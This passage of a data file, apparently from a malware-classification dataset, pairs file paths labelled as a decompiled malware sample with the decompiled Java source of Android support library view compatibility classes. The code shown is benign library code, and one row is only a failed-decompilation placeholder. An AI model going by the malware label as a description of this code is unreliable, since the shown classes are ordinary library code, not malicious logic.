AccessibilityDelegateCompat accessibilityDelegateCompat);     void setAccessibilityLiveRegion(    View view,    int i);     void setHasTransientState(    View view,    boolean z);     void setImportantForAccessibility(    View view,    int i);     void setLabelFor(    View view,    int i);     void setLayerPaint(    View view,    Paint paint);     void setLayerType(    View view,    int i,    Paint paint);     void setLayoutDirection(    View view,    int i);     void setOverScrollMode(    View view,    int i);   } static class BaseViewCompatImpl implements ViewCompatImpl {     BaseViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return false;     }     @Override public boolean canScrollVertically(    View v,    int direction){       return false;     }     @Override public int getOverScrollMode(    View v){       return 2;     }     @Override public void setOverScrollMode(    View v,    int mode){     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){     }     @Override public boolean hasTransientState(    View view){       return false;     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){     }     @Override public void postInvalidateOnAnimation(    View view){       view.postInvalidateDelayed(getFrameTime());     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       view.postDelayed(action,getFrameTime());     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       view.postDelayed(action,getFrameTime() + delayMillis);     }     long getFrameTime(){       return ViewCompat.FAKE_FRAME_TIME;     }     @Override public int getImportantForAccessibility(    View view){       return 0;     }     @Override public void setImportantForAccessibility(    View view,    int mode){     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return false;     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       return null;     }     @Override public float getAlpha(    View view){       return 1.0f;     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){     }     @Override public int getLayerType(    View view){       return 0;     }     @Override public int getLabelFor(    View view){       return 0;     }     @Override public void setLabelFor(    View view,    int id){     }     @Override public void setLayerPaint(    View view,    Paint p){     }     @Override public int getLayoutDirection(    View view){       return 0;     }     @Override public void setLayoutDirection(    View view,    int layoutDirection){     }     @Override public ViewParent getParentForAccessibility(    View view){       return view.getParent();     }     @Override public boolean isOpaque(    View view){       Drawable bg=view.getBackground();       return bg != null && bg.getOpacity() == -1;     }     @Override public int resolveSizeAndState(    int size,    int measureSpec,    int childMeasuredState){       return View.resolveSize(size,measureSpec);     }     @Override public int getMeasuredWidthAndState(    View view){       return view.getMeasuredWidth();     }     @Override public int getMeasuredHeightAndState(    View view){       return view.getMeasuredHeight();     }     @Override public int getMeasuredState(    View view){       return 0;     }     @Override public int getAccessibilityLiveRegion(    View view){       return 0;     }     @Override public void setAccessibilityLiveRegion(    View view,    int mode){     }   } static class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {     EclairMr1ViewCompatImpl(){     }     @Override public boolean isOpaque(    View view){       return ViewCompatEclairMr1.isOpaque(view);     }   } static class GBViewCompatImpl extends EclairMr1ViewCompatImpl {     GBViewCompatImpl(){     }     @Override public int getOverScrollMode(    View v){       return ViewCompatGingerbread.getOverScrollMode(v);     }     @Override public void setOverScrollMode(    View v,    int mode){       ViewCompatGingerbread.setOverScrollMode(v,mode);     }   } static class HCViewCompatImpl extends GBViewCompatImpl {     HCViewCompatImpl(){     }     @Override long getFrameTime(){       return ViewCompatHC.getFrameTime();     }     @Override public float getAlpha(    View view){       return ViewCompatHC.getAlpha(view);     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){       ViewCompatHC.setLayerType(view,layerType,paint);     }     @Override public int getLayerType(    View view){       return ViewCompatHC.getLayerType(view);     }     @Override public void setLayerPaint(    View view,    Paint paint){       setLayerType(view,getLayerType(view),paint);       view.invalidate();     }     @Override public int resolveSizeAndState(    int size,    int measureSpec,    int childMeasuredState){       return ViewCompatHC.resolveSizeAndState(size,measureSpec,childMeasuredState);     }     @Override public int getMeasuredWidthAndState(    View view){       return ViewCompatHC.getMeasuredWidthAndState(view);     }     @Override public int getMeasuredHeightAndState(    View view){       return ViewCompatHC.getMeasuredHeightAndState(view);     }     @Override public int getMeasuredState(    View view){       return ViewCompatHC.getMeasuredState(view);     }   } static class ICSViewCompatImpl extends HCViewCompatImpl {     ICSViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return ViewCompatICS.canScrollHorizontally(v,direction);     }     @Override public boolean canScrollVertically(    View v,    int direction){       return ViewCompatICS.canScrollVertically(v,direction);     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onPopulateAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onInitializeAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){       ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){       ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());     }   } static class JBViewCompatImpl extends ICSViewCompatImpl {     JBViewCompatImpl(){     }     @Override public boolean hasTransientState(    View view){       return ViewCompatJB.hasTransientState(view);     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){       ViewCompatJB.setHasTransientState(view,hasTransientState);     }     @Override public void postInvalidateOnAnimation(    View view){       ViewCompatJB.postInvalidateOnAnimation(view);     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       ViewCompatJB.postOnAnimation(view,action);     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);     }     @Override public int getImportantForAccessibility(    View view){       return ViewCompatJB.getImportantForAccessibility(view);     }     @Override public void setImportantForAccessibility(    View view,    int mode){       ViewCompatJB.setImportantForAccessibility(view,mode);     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return ViewCompatJB.performAccessibilityAction(view,action,arguments);     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);       if (compat != null) {         return new AccessibilityNodeProviderCompat(compat);       }       return null;     }     @Override public ViewParent getParentForAccessibility(    View view){       return ViewCompatJB.getParentForAccessibility(view);     }   } static class JbMr1ViewCompatImpl extends JBViewCompatImpl {     JbMr1ViewCompatImpl(){     }     @Override public int getLabelFor(    View view){       return ViewCompatJellybeanMr1.getLabelFor(view);     }     @Override public void setLabelFor(    View view,    int id){       ViewCompatJellybeanMr1.setLabelFor(view,id);     }     @Override public void setLayerPaint(    View view,    Paint paint){       ViewCompatJellybeanMr1.setLayerPaint(view,paint);     }     @Override public int getLayoutDirection(    View view){       return ViewCompatJellybeanMr1.getLayoutDirection(view);     }     @Override public void setLayoutDirection(    View view,    int layoutDirection){       ViewCompatJellybeanMr1.setLayoutDirection(view,layoutDirection);     }   } static class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {     KitKatViewCompatImpl(){     }     @Override public int getAccessibilityLiveRegion(    View view){       return ViewCompatKitKat.getAccessibilityLiveRegion(view);     }     @Override public void setAccessibilityLiveRegion(    View view,    int mode){       ViewCompatKitKat.setAccessibilityLiveRegion(view,mode);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatViewCompatImpl();       return;     }     if (version >= 17) {       IMPL=new JbMr1ViewCompatImpl();       return;     }     if (version >= 16) {       IMPL=new JBViewCompatImpl();       return;     }     if (version >= 14) {       IMPL=new ICSViewCompatImpl();       return;     }     if (version >= 11) {       IMPL=new HCViewCompatImpl();     }  else     if (version >= 9) {       IMPL=new GBViewCompatImpl();     }  else {       IMPL=new BaseViewCompatImpl();     }   }   public static boolean canScrollHorizontally(  View v,  int direction){     return IMPL.canScrollHorizontally(v,direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return IMPL.canScrollVertically(v,direction);   }   public static int getOverScrollMode(  View v){     return IMPL.getOverScrollMode(v);   }   public static void setOverScrollMode(  View v,  int overScrollMode){     IMPL.setOverScrollMode(v,overScrollMode);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(v,info);   }   public static void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     IMPL.setAccessibilityDelegate(v,delegate);   }   public static boolean hasTransientState(  View view){     return IMPL.hasTransientState(view);   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     IMPL.setHasTransientState(view,hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     IMPL.postInvalidateOnAnimation(view);   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     IMPL.postInvalidateOnAnimation(view,left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     IMPL.postOnAnimation(view,action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     IMPL.postOnAnimationDelayed(view,action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return IMPL.getImportantForAccessibility(view);   }   public static void setImportantForAccessibility(  View view,  int mode){     IMPL.setImportantForAccessibility(view,mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return IMPL.performAccessibilityAction(view,action,arguments);   }   public static AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(view);   }   public static float getAlpha(  View view){     return IMPL.getAlpha(view);   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     IMPL.setLayerType(view,layerType,paint);   }   public static int getLayerType(  View view){     return IMPL.getLayerType(view);   }   public static int getLabelFor(  View view){     return IMPL.getLabelFor(view);   }   public static void setLabelFor(  View view,  int labeledId){     IMPL.setLabelFor(view,labeledId);   }   public static void setLayerPaint(  View view,  Paint paint){     IMPL.setLayerPaint(view,paint);   }   public static int getLayoutDirection(  View view){     return IMPL.getLayoutDirection(view);   }   public static void setLayoutDirection(  View view,  int layoutDirection){     IMPL.setLayoutDirection(view,layoutDirection);   }   public static ViewParent getParentForAccessibility(  View view){     return IMPL.getParentForAccessibility(view);   }   public static boolean isOpaque(  View view){     return IMPL.isOpaque(view);   }   public static int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return IMPL.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   public static int getMeasuredWidthAndState(  View view){     return IMPL.getMeasuredWidthAndState(view);   }   public static int getMeasuredHeightAndState(  View view){     return IMPL.getMeasuredHeightAndState(view);   }   public static int getMeasuredState(  View view){     return IMPL.getMeasuredState(view);   }   public int getAccessibilityLiveRegion(  View view){     return IMPL.getAccessibilityLiveRegion(view);   }   public void setAccessibilityLiveRegion(  View view,  int mode){     IMPL.setAccessibilityLiveRegion(view,mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatEclairMr1.code","class ViewCompatEclairMr1 {   ViewCompatEclairMr1(){   }   public static boolean isOpaque(  View view){     return view.isOpaque();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatGingerbread.code","class ViewCompatGingerbread {   ViewCompatGingerbread(){   }   public static int getOverScrollMode(  View v){     return v.getOverScrollMode();   }   public static void setOverScrollMode(  View v,  int mode){     v.setOverScrollMode(mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatHC.code","class ViewCompatHC {   ViewCompatHC(){   }   public static long getFrameTime(){     return ValueAnimator.getFrameDelay();   }   public static float getAlpha(  View view){     return view.getAlpha();   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     view.setLayerType(layerType,paint);   }   public static int getLayerType(  View view){     return view.getLayerType();   }   public static int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return View.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   public static int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidthAndState();   }   public static int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeightAndState();   }   public static int getMeasuredState(  View view){     return view.getMeasuredState();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatICS.code","class ViewCompatICS {   ViewCompatICS(){   }   public static boolean canScrollHorizontally(  View v,  int direction){     return v.canScrollHorizontally(direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return v.canScrollVertically(direction);   }   public static void setAccessibilityDelegate(  View v,  Object delegate){     v.setAccessibilityDelegate((View.AccessibilityDelegate)delegate);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onPopulateAccessibilityEvent(event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onInitializeAccessibilityEvent(event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  Object info){     v.onInitializeAccessibilityNodeInfo((AccessibilityNodeInfo)info);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatImpl.code","interface ViewCompatImpl {   boolean canScrollHorizontally(  View view,  int i);   boolean canScrollVertically(  View view,  int i);   int getAccessibilityLiveRegion(  View view);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view);   float getAlpha(  View view);   int getImportantForAccessibility(  View view);   int getLabelFor(  View view);   int getLayerType(  View view);   int getLayoutDirection(  View view);   int getMeasuredHeightAndState(  View view);   int getMeasuredState(  View view);   int getMeasuredWidthAndState(  View view);   int getOverScrollMode(  View view);   ViewParent getParentForAccessibility(  View view);   boolean hasTransientState(  View view);   boolean isOpaque(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void postInvalidateOnAnimation(  View view);   void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4);   void postOnAnimation(  View view,  Runnable runnable);   void postOnAnimationDelayed(  View view,  Runnable runnable,  long j);   int resolveSizeAndState(  int i,  int i2,  int i3);   void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat);   void setAccessibilityLiveRegion(  View view,  int i);   void setHasTransientState(  View view,  boolean z);   void setImportantForAccessibility(  View view,  int i);   void setLabelFor(  View view,  int i);   void setLayerPaint(  View view,  Paint paint);   void setLayerType(  View view,  int i,  Paint paint);   void setLayoutDirection(  View view,  int i);   void setOverScrollMode(  View view,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatJB.code","class ViewCompatJB {   ViewCompatJB(){   }   public static boolean hasTransientState(  View view){     return view.hasTransientState();   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     view.setHasTransientState(hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     view.postInvalidateOnAnimation();   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidate(left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     view.postOnAnimation(action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postOnAnimationDelayed(action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return view.getImportantForAccessibility();   }   public static void setImportantForAccessibility(  View view,  int mode){     view.setImportantForAccessibility(mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return view.performAccessibilityAction(action,arguments);   }   public static Object getAccessibilityNodeProvider(  View view){     return view.getAccessibilityNodeProvider();   }   public static ViewParent getParentForAccessibility(  View view){     return view.getParentForAccessibility();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatJellybeanMr1.code","class ViewCompatJellybeanMr1 {   ViewCompatJellybeanMr1(){   }   public static int getLabelFor(  View view){     return view.getLabelFor();   }   public static void setLabelFor(  View view,  int id){     view.setLabelFor(id);   }   public static void setLayerPaint(  View view,  Paint paint){     view.setLayerPaint(paint);   }   public static int getLayoutDirection(  View view){     return view.getLayoutDirection();   }   public static void setLayoutDirection(  View view,  int layoutDirection){     view.setLayoutDirection(layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewCompatKitKat.code","public class ViewCompatKitKat {   public static int getAccessibilityLiveRegion(  View view){     return view.getAccessibilityLiveRegion();   }   public static void setAccessibilityLiveRegion(  View view,  int mode){     view.setAccessibilityLiveRegion(mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewConfigurationCompat.code","public class ViewConfigurationCompat {   static final ViewConfigurationVersionImpl IMPL; interface ViewConfigurationVersionImpl {     int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration);   } static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     BaseViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return config.getScaledTouchSlop();     }   } static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     FroyoViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new FroyoViewConfigurationVersionImpl();     }  else {       IMPL=new BaseViewConfigurationVersionImpl();     }   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return IMPL.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewConfigurationCompatFroyo.code","class ViewConfigurationCompatFroyo {   ViewConfigurationCompatFroyo(){   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewConfigurationVersionImpl.code","interface ViewConfigurationVersionImpl {   int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompat.code","public class ViewGroupCompat {   static final ViewGroupCompatImpl IMPL;   public static final int LAYOUT_MODE_CLIP_BOUNDS=0;   public static final int LAYOUT_MODE_OPTICAL_BOUNDS=1; interface ViewGroupCompatImpl {     int getLayoutMode(    ViewGroup viewGroup);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void setLayoutMode(    ViewGroup viewGroup,    int i);     void setMotionEventSplittingEnabled(    ViewGroup viewGroup,    boolean z);   } static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {     ViewGroupCompatStubImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return true;     }     @Override public void setMotionEventSplittingEnabled(    ViewGroup group,    boolean split){     }     @Override public int getLayoutMode(    ViewGroup group){       return 0;     }     @Override public void setLayoutMode(    ViewGroup group,    int mode){     }   } static class ViewGroupCompatHCImpl extends ViewGroupCompatStubImpl {     ViewGroupCompatHCImpl(){     }     @Override public void setMotionEventSplittingEnabled(    ViewGroup group,    boolean split){       ViewGroupCompatHC.setMotionEventSplittingEnabled(group,split);     }   } static class ViewGroupCompatIcsImpl extends ViewGroupCompatHCImpl {     ViewGroupCompatIcsImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);     }   } static class ViewGroupCompatJellybeanMR2Impl extends ViewGroupCompatIcsImpl {     ViewGroupCompatJellybeanMR2Impl(){     }     @Override public int getLayoutMode(    ViewGroup group){       return ViewGroupCompatJellybeanMR2.getLayoutMode(group);     }     @Override public void setLayoutMode(    ViewGroup group,    int mode){       ViewGroupCompatJellybeanMR2.setLayoutMode(group,mode);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 18) {       IMPL=new ViewGroupCompatJellybeanMR2Impl();       return;     }     if (version >= 14) {       IMPL=new ViewGroupCompatIcsImpl();     }  else     if (version >= 11) {       IMPL=new ViewGroupCompatHCImpl();     }  else {       IMPL=new ViewGroupCompatStubImpl();     }   }   private ViewGroupCompat(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(group,child,event);   }   public static void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     IMPL.setMotionEventSplittingEnabled(group,split);   }   public static int getLayoutMode(  ViewGroup group){     return IMPL.getLayoutMode(group);   }   public static void setLayoutMode(  ViewGroup group,  int mode){     IMPL.setLayoutMode(group,mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatHC.code","class ViewGroupCompatHC {   private ViewGroupCompatHC(){   }   public static void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     group.setMotionEventSplittingEnabled(split);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatHCImpl.code","static class ViewGroupCompatHCImpl extends ViewGroupCompatStubImpl {   ViewGroupCompatHCImpl(){   }   @Override public void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     ViewGroupCompatHC.setMotionEventSplittingEnabled(group,split);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatIcs.code","class ViewGroupCompatIcs {   ViewGroupCompatIcs(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return group.onRequestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatIcsImpl.code","static class ViewGroupCompatIcsImpl extends ViewGroupCompatHCImpl {   ViewGroupCompatIcsImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatImpl.code","interface ViewGroupCompatImpl {   int getLayoutMode(  ViewGroup viewGroup);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void setLayoutMode(  ViewGroup viewGroup,  int i);   void setMotionEventSplittingEnabled(  ViewGroup viewGroup,  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatJellybeanMR2.code","class ViewGroupCompatJellybeanMR2 {   ViewGroupCompatJellybeanMR2(){   }   public static int getLayoutMode(  ViewGroup group){     return group.getLayoutMode();   }   public static void setLayoutMode(  ViewGroup group,  int mode){     group.setLayoutMode(mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatJellybeanMR2Impl.code","static class ViewGroupCompatJellybeanMR2Impl extends ViewGroupCompatIcsImpl {   ViewGroupCompatJellybeanMR2Impl(){   }   @Override public int getLayoutMode(  ViewGroup group){     return ViewGroupCompatJellybeanMR2.getLayoutMode(group);   }   @Override public void setLayoutMode(  ViewGroup group,  int mode){     ViewGroupCompatJellybeanMR2.setLayoutMode(group,mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewGroupCompatStubImpl.code","static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {   ViewGroupCompatStubImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return true;   }   @Override public void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){   }   @Override public int getLayoutMode(  ViewGroup group){     return 0;   }   @Override public void setLayoutMode(  ViewGroup group,  int mode){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7a810115"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewParentCompat.code","public class ViewParentCompat {   static final ViewParentCompatImpl IMPL; interface ViewParentCompatImpl {     boolean requestSendAccessibilityEvent(    ViewParent viewParent,    View view,    AccessibilityEvent accessibilityEvent);   } static class ViewParentCompatStubImpl implements ViewParentCompatImpl {     ViewParentCompatStubImpl(){     }     @Override public boolean requestSendAccessibilityEvent(    ViewParent parent,    View child,    AccessibilityEvent event){       if (child == null) {         return false;       }       AccessibilityManager manager=(AccessibilityManager)child.getContext().getSystemService(""accessibility"");       manager.sendAccessibilityEvent(event);       return true;     }   } static class ViewParentCompatICSImpl extends ViewParentCompatStubImpl {     ViewParentCompatICSImpl(){     }     @Override public boolean requestSendAccessibilityEvent(    ViewParent parent,    View child,    AccessibilityEvent event){       return ViewParentCompatICS.requestSendAccessibilityEvent(parent,child,event);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ViewParentCompatICSImpl();     }  else {       IMPL=new ViewParentCompatStubImpl();     }   }   private ViewParentCompat(){   }   public static boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return IMPL.requestSendAccessibilityEvent(parent,child,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewParentCompatICS.code","public class ViewParentCompatICS {   public static boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return parent.requestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewParentCompatICSImpl.code","static class ViewParentCompatICSImpl extends ViewParentCompatStubImpl {   ViewParentCompatICSImpl(){   }   @Override public boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return ViewParentCompatICS.requestSendAccessibilityEvent(parent,child,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewParentCompatImpl.code","interface ViewParentCompatImpl {   boolean requestSendAccessibilityEvent(  ViewParent viewParent,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewParentCompatStubImpl.code","static class ViewParentCompatStubImpl implements ViewParentCompatImpl {   ViewParentCompatStubImpl(){   }   @Override public boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     if (child == null) {       return false;     }     AccessibilityManager manager=(AccessibilityManager)child.getContext().getSystemService(""accessibility"");     manager.sendAccessibilityEvent(event);     return true;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ViewPositionComparator.code","public static class ViewPositionComparator implements Comparator<View> {   ViewPositionComparator(){   }   @Override public int compare(  View lhs,  View rhs){     LayoutParams llp=(LayoutParams)lhs.getLayoutParams();     LayoutParams rlp=(LayoutParams)rhs.getLayoutParams();     if (llp.isDecor != rlp.isDecor) {       return llp.isDecor ? 1 : -1;     }     return llp.position - rlp.position;   } } "
